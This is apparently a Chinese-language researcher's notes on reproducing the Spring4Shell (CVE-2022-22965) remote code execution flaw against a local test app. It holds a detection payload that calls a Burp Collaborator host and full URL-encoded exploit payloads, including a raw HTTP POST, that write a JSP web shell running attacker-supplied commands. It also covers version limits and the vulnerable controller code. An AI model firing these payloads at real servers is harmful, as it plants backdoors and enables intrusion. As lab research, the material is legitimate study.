参考：
- [Spring 框架漏洞集合](https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/)
- [Spring 全家桶各类 RCE 漏洞浅析](https://paper.seebug.org/1422/#_3)
- [spring actuator restart logging.config rce](https://landgrey.me/blog/21/)
- https://github.com/LandGrey/SpringBootVulExploit
- [Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索](https://landgrey.me/blog/22/)
- [CVE-2021-22060: Additional Log Injection in Spring Framework (follow-up to CVE-2021-22096)](https://tanzu.vmware.com/security/cve-2021-22060)
- https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2022/CVE-2022-22965.yaml


## Spring RCE
影响范围：
-  [2.5,2.5.6.SEC02)

### 无损检测
```
?class.module.classLoader.resources.context.configFile=http://j0kz86tl0wpygo1qh2lud49vvm1fp4.burpcollaborator.net/spring4shell&class.module.classLoader.resources.context.configFile.content.aaa=xxx
```
通过设置content，实现发起http请求的目的。

- https://xeldax.top/article/spring4shell_study

### FAQ

#### 为啥只能JDK9
> JDK1.8下测试，class bean下没有module bean，导致后续无法利用，如果是class.classLoader则会被黑名单拦截。

#### 为啥springboot不行
> JDK9 springboot下的，和springMVC的classloader不一样，是AppClassLoader，没有getResources()。springMVC是ParallelWebappClassLoader

## PoC
- https://github.com/craig/SpringCore0day/blob/main/exp.py
- https://github.com/lunasec-io/Spring4Shell-POC/blob/master/exploit.py


```
    headers = {"suffix":"%>//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"

    }

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

准备复现，
刚从tomcat官网下了个tomcat-8.5.78: https://dlcdn.apache.org/tomcat/tomcat-8/v8.5.78/bin/apache-tomcat-8.5.78-windows-x64.zip

结果失败了，
![image](https://user-images.githubusercontent.com/30398606/161372147-431252a3-0a8e-472d-8ef9-1212d0781f1a.png)

```
Invalid property 'class.module.classLoader.resources' of bean class [java.lang.Module]: Could not instantiate property type [org.apache.catalina.WebResourceRoot] to auto-grow nested property path; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.catalina.WebResourceRoot]: Specified class is an interface
```

很快啊，原来是：
> Effectively disable the WebappClassLoaderBase.getResources() method as it is not used and if something accidently exposes the class loader this method can be used to gain access to Tomcat internals.

- https://tomcat.apache.org/tomcat-8.5-doc/changelog.html

所以目前的payload对于tomcat作为web容器的利用方式下，影响范围是：tomcat < 8.5.78

那就下载8.5.77:
- https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.77/bin/apache-tomcat-8.5.77-windows-x64.zip

tomcat换了之后依然没有成功。
![image](https://user-images.githubusercontent.com/30398606/161372361-0c85d1ca-1a4a-46b1-862a-7c7c19156635.png)
可能因为我是直接在windows上双击startup.bat导致日志直接输出到控制台，而没有机会写入到文件？
原来是使用这个：https://github.com/craig/SpringCore0day/blob/main/exp.py
导致有个引号的bug吧。
![image](https://user-images.githubusercontent.com/30398606/161375232-2b243cef-2e90-415a-9320-b8f894b3ffef.png)


使用这个成功了：
https://github.com/lunasec-io/Spring4Shell-POC
```
POST /java-sec-code-1.0.0/login3 HTTP/1.1
Host: 192.168.183.129:8088
User-Agent: python-requests/2.20.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 698

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

![image](https://user-images.githubusercontent.com/30398606/161375660-ac8e4630-18e8-4046-ae9c-338b7a2110a8.png)


对应代码：
```java
    @RequestMapping("/login2")
    public void login2(@RequestBody User user) {
        System.out.println(user.getUsername());
        System.out.println(user.getPassword());
    }


    @RequestMapping("/login3")
    public void login3(User user) {
        System.out.println(user.getUsername());
        System.out.println(user.getPassword());
    }
```
其中login2这个endpoint要求请求的Content-Type是json类型。

### 无损检测

![image](https://user-images.githubusercontent.com/30398606/169263864-c581fd76-2fc5-453e-a721-c971b8250cbd.png)
```
/java-sec-code-1.0.0/login3?class.module.classLoader.resources.context.configFile=http://j0kz86tl0wpygo1qh2lud49vvm1fp4.burpcollaborator.net/spring4shell&class.module.classLoader.resources.context.configFile.content.aaa=xxx&username=test
```


### Ref
- [CVE-2010-1622: Spring Framework execution of arbitrary code](https://seclists.org/fulldisclosure/2010/Jun/456)
- [Spring Framework - Arbitrary code Execution](https://www.exploit-db.com/exploits/13918)
- [Spring Core RCE 0day｜文末报告附件](https://mp.weixin.qq.com/s/P-NEJzUUjIyemkSe_RbicQ)
- https://github.com/spring-projects/spring-framework/commit/7f7fb58dd0dae86d22268a4b59ac7c72a6c22529
